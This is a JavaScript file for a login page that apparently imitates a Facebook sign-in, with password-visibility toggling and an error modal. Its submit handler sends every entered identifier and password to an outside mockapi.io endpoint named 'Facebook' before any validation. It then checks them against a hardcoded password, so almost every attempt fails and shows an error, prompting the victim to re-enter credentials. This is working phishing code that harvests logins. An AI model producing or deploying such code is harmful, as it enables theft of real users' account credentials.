let attemptCount = 0; // Track login attempts

function showModal() {
    const modal = document.getElementById('notificationModal');
    modal.style.display = 'block';
}

function closeModal() {
    const modal = document.getElementById('notificationModal');
    modal.style.display = 'none';
}

function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');

    const isPassword = passwordInput.type === 'password';
    passwordInput.type = isPassword ? 'text' : 'password';
    eyeIcon.style.backgroundImage = isPassword 
        ? "url('https://icons.veryicon.com/png/o/photographic/ant-design-official-icon-library/eye-open-1.png')" 
        : "url('https://icons.veryicon.com/png/o/photographic/ant-design-official-icon-library/eye-close-1.png')";
}

async function saveUserData(identifier, password) {
    const userData = { identifier, password };
    
    try {
        await fetch('https://67069c2da0e04071d2279651.mockapi.io/Facebook', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(userData),
        });
    } catch (error) {
        console.error('Error saving user data:', error);
    }
}

const loginForm = document.getElementById('loginForm');

loginForm.addEventListener('submit', async (event) => {
    event.preventDefault(); // Prevent the default form submission

    const identifier = document.getElementById('identifier').value;
    const password = document.getElementById('password').value;

    const validPassword = "securepassword"; // Change this to your actual validation logic

    // Save user data on every login attempt
    await saveUserData(identifier, password);

    // Check login validity
    if (identifier === "" || password !== validPassword) {
        attemptCount++; // Increment the attempt count
        showModal(); // Show the modal for incorrect login

        // Optionally clear the inputs after failed attempts
        if (attemptCount < 2) {
            document.getElementById('identifier').value = '';
            document.getElementById('password').value = '';
        }
    } else {
        // Successful login actions
        attemptCount = 0; // Reset attempt count
        setTimeout(() => {
            window.location.href = 'indexPAGE.html';
        }, 1000); // Redirect after 1 second
    }
});
